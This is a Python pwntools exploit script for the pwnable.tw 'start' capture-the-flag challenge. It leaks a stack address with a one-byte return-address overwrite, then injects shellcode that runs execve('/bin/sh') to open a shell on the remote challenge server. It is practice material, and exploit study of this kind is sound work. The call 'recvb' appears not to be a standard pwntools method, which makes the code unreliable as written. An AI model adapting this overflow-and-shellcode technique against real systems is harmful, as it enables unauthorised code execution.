#!/usr/bin/env python3

from pwn import *

exe = ELF("./start")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else: 
        r = remote("chall.pwnable.tw", 10000)

    return r


def main():
    r = conn()

    # Leak stack address by, jumping to after edx is set to 0x14, so that the write syscall will write 0x3c bytes i.e. jump to 0x804808b
    #
    #       0x08048089 <+41>:    mov    dl,0x14
    #    => 0x0804808b <+43>:    mov    bl,0x1
    #       0x0804808d <+45>:    mov    al,0x4
    #       0x0804808f <+47>:    int    0x80
    r.sendafter(b'CTF:', b'A'*0x14 + b'\x8b') # We only need to overwrite the LSB of the retaddr
    addr_buffer = u32(r.recvb(0x1c)[0x18:]) - 0x1c # addr_buffer is a fixed offset from the saved ebp

    log.info(f"{addr_buffer=}")

    # Inject shellcode
    shellcode = '''
        /* We need to do this so that the stack doesn't interfere with our shellcode when growing downwards */
        add esp, 0x18

        /* push '/bin/sh\x00' */
        push 0x0068732f
        push 0x6e69622f
        mov ebx, esp

        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        push 0x00006873
        xor ecx, ecx
        push ecx /* null terminate */
        push 4
        pop ecx
        add ecx, esp
        push ecx /* 'sh\x00' */
        mov ecx, esp
        xor edx, edx
        
        /* call execve() */
        push 11 /* 0xb */
        pop eax
        int 0x80
    '''
    r.send(asm(shellcode).ljust(0x2c, b'\x00') + p32(addr_buffer))

    log.info(f"{asm(shellcode)=}")

    r.interactive()

if __name__ == "__main__":
    main()
